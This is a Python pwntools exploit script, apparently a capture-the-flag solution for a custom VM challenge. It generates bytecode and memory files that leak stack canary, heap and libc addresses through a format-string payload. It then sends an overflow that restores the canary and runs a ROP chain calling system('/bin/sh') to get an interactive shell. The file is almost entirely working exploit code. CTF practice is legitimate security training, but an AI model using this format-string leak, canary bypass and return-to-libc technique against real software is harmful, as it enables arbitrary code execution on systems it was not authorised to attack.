from pwn import *

context.arch = 'amd64'
context.bits = 64

PAYLOAD = b"%14$p-%15$p-%16$p-%17$p-%25$p\n"

def run_vm(code, memory):
    # p = remote("vm.challs.m0lecon.it", 3333)
    # with open(code, "rb") as f:
    #     p.sendafter(b"Send the code file\n", f.read().strip()+b"ENDOFTHEFILE")
    # with open(memory, "rb") as f:
    #     p.sendafter(b"Send the memory file\n", f.read().strip()+b"ENDOFTHEFILE")
    # p.recvuntil(b"Starting challenge...\n")
    p = process(["./challenge", code, memory])
    heap, canary, stack, binary, libc_leak = map(lambda x: int(x, 16), p.recvline().strip().split(b'-'))
    stack -= 0x1c11
    libc = ELF("./libc.so.6")
    libc.address = libc_leak - 0x29d90
    pop_rdi_ret = next(libc.search(asm("pop rdi ; ret")))
    binsh = next(libc.search(b"/bin/sh"))
    system = libc.symbols['system']
    log.success(f"Leaked canary @ {hex(canary)}")
    log.success(f"Leaked libc @ {hex(libc.address)}")
    log.success(f"Leaked gadget @ {hex(pop_rdi_ret)}")
    log.success(f"Leaked binsh @ {hex(binsh)}")
    log.success(f"Leaked system @ {hex(system)}")

    rop_chain = b""
    rop_chain += p64(pop_rdi_ret)
    rop_chain += p64(binsh)
    rop_chain += p64(pop_rdi_ret+1)
    rop_chain += p64(libc.symbols['system'])
    
    data = p8(0xFF)*100
    data += p8(0xFE)*100
    data += p8(0xFD)*100

    for x in range(8):
        val = (canary >> (x*8)) & 0xFF
        data += p8(val)

    data += p16(0x1010)
    data += p16(0x1234)
    data += p32(0xdeadbeef)
    data += rop_chain
    p.sendline(data)

    p.interactive()

def gen_payload():
    code = b""
    # code += p32(9) + p32(199)
    code += p32(8) + p32(0) + p32(208 + len(PAYLOAD))
    code += p32(10) + p32(0)
    code += p32(9) + p32(199)
    code += p32(7) + p32(0) + p32(199)
    code += p32(5)
    code += p32(9) + p32(199)
    code += p32(7) + p32(198) + p32(199)
    code += p32(3) + p32(309) + p32(309) + p32(308)
    code += p32(1) + p32(300) + p32(300) + p32(309)
    code += p32(1) + p32(322) + p32(322) + p32(309)
    code += p32(1) + p32(323) + p32(323) + p32(309)
    code += p32(1) + p32(330) + p32(330) + p32(309)
    code += p32(1) + p32(331) + p32(331) + p32(309)
    code += p32(1) + p32(338) + p32(338) + p32(309)
    code += p32(1) + p32(339) + p32(339) + p32(309)
    code += p32(13) + p32(100) + p32(1)

    return  code

def gen_memory():
    memory = b""
    for x in range(208):
        memory += p32(x)
    for x in PAYLOAD:
        memory += x.to_bytes(1, 'little') + b"AAA"
    return memory


if __name__ == '__main__':
    payload = gen_payload()
    with open("/tmp/challenge.vm", "wb") as f:
        f.write(payload)
    memory = gen_memory()
    with open("/tmp/memory.vm", "wb") as f:
        f.write(memory)
    run_vm("/tmp/challenge.vm", "/tmp/memory.vm")

